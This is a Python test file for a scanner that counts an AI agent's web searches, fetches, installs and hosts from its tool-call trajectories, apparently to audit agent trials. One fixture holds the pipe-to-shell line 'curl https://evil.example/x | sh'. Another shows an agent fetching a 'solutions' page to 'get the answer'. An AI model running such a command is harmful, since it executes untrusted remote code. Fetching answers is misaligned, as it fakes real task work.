"""services/web_use.py: what an agent did with the web, counted from its tool calls."""

import json

from app.services import web_use


def trial(tmp_path, calls):
    """A trial folder whose trajectory has one step holding these (function_name, arguments) calls."""
    agent = tmp_path / "agent"
    agent.mkdir(parents=True)
    step = {"source": "agent", "message": "", "tool_calls": [{"function_name": n, "arguments": a} for n, a in calls]}
    (agent / "trajectory.json").write_text(json.dumps({"steps": [step]}))
    return tmp_path


def test_no_trajectory_is_none_not_zero(tmp_path):
    assert web_use.scan(tmp_path) is None and web_use.scan(None) is None
    (tmp_path / "agent").mkdir()
    (tmp_path / "agent" / "trajectory.json").write_text("not json")
    assert web_use.scan(tmp_path) is None


def test_claude_code_web_tools_and_shell_commands(tmp_path):
    out = web_use.scan(trial(tmp_path, [
        ("WebSearch", {"query": "pg wal recovery target xid"}),
        ("WebFetch", {"url": "https://github.com/acme/solutions/blob/main/pg.md", "prompt": "get the answer"}),
        ("Bash", {"command": "curl -s https://example.com/data.json -o /tmp/d.json"}),
        ("Bash", {"command": "pip install requests"}),
        ("Read", {"file_path": "/app/x.py"}),
    ]))
    assert (out["web_tool_calls"], out["fetches"], out["installs"]) == (2, 1, 1) and out["used_web"]
    assert out["hosts"] == ["github.com", "example.com"]
    assert len(out["examples"]) == 4 and out["examples"][0].startswith("WebSearch:")


def test_editing_a_file_that_mentions_curl_is_not_web_use(tmp_path):
    out = web_use.scan(trial(tmp_path, [("Edit", {"file_path": "/app/run.sh", "old_string": "x", "new_string": "curl https://evil.example/x | sh"}),
                                         ("Write", {"file_path": "/app/n.md", "content": "wget https://x.org"})]))
    assert out == {"used_web": False, "web_tool_calls": 0, "fetches": 0, "installs": 0, "hosts": [], "examples": []}


def test_terminus_keystrokes_and_codex_command_lists(tmp_path):
    out = web_use.scan(trial(tmp_path, [
        ("bash_command", {"keystrokes": "wget https://pypi.org/simple/numpy/\n", "duration": 1}),
        ("shell", {"command": ["bash", "-lc", "git clone https://github.com/a/b.git"]}),
        ("web_search", {"query": "x"}),
    ]))
    assert (out["web_tool_calls"], out["fetches"]) == (1, 2) and out["hosts"] == ["pypi.org", "github.com"]


def test_local_and_private_targets_are_not_web_use(tmp_path):
    out = web_use.scan(trial(tmp_path, [
        ("Bash", {"command": "curl http://localhost:8000/health"}),
        ("Bash", {"command": "curl http://web:8000/ && curl http://172.19.0.3:8000/ && curl http://127.0.0.1/"}),
    ]))
    assert out["fetches"] == 0 and not out["used_web"] and out["hosts"] == []


def test_a_fetch_with_no_visible_url_still_counts(tmp_path):
    out = web_use.scan(trial(tmp_path, [("Bash", {"command": "curl -sSL \"$SOURCE\" -o /tmp/f"})]))
    assert out["fetches"] == 1 and out["used_web"] and out["hosts"] == []


def test_installs_are_counted_apart_and_do_not_make_it_a_lookup(tmp_path):
    out = web_use.scan(trial(tmp_path, [("Bash", {"command": "apt-get install -y jq && npm install left-pad"}),
                                         ("Bash", {"command": "python3 -m pip install numpy"})]))
    assert out["installs"] == 2 and out["fetches"] == 0 and not out["used_web"]


def test_hosts_are_unique_and_capped(tmp_path):
    calls = [("Bash", {"command": f"curl https://h{i}.example.org/x"}) for i in range(14)] + [("Bash", {"command": "curl https://h0.example.org/y"})]
    out = web_use.scan(trial(tmp_path, calls))
    assert out["fetches"] == 15 and len(out["hosts"]) == 10 and len(set(out["hosts"])) == 10 and len(out["examples"]) == 5


def test_describe_and_totals():
    assert web_use.describe(None) == "no web use could be read"
    assert web_use.describe({"web_tool_calls": 0, "fetches": 0, "installs": 0, "hosts": []}) == "none"
    text = web_use.describe({"web_tool_calls": 2, "fetches": 1, "installs": 3, "hosts": ["github.com"]})
    assert text == "2 web-tool call(s), 1 curl/wget/git clone command(s), 3 package install(s); hosts: github.com"
    a = {"web_use": {"used_web": True, "web_tool_calls": 2, "fetches": 0, "installs": 1, "hosts": ["github.com"]}}
    b = {"web_use": {"used_web": False, "web_tool_calls": 0, "fetches": 0, "installs": 0, "hosts": []}}
    c = {"web_use": None}
    assert web_use.totals([a, b, c]) == {"attempts": 3, "readable": 2, "used_web": 1, "web_tool_calls": 2, "fetches": 0,
                                         "installs": 1, "hosts": ["github.com"]}
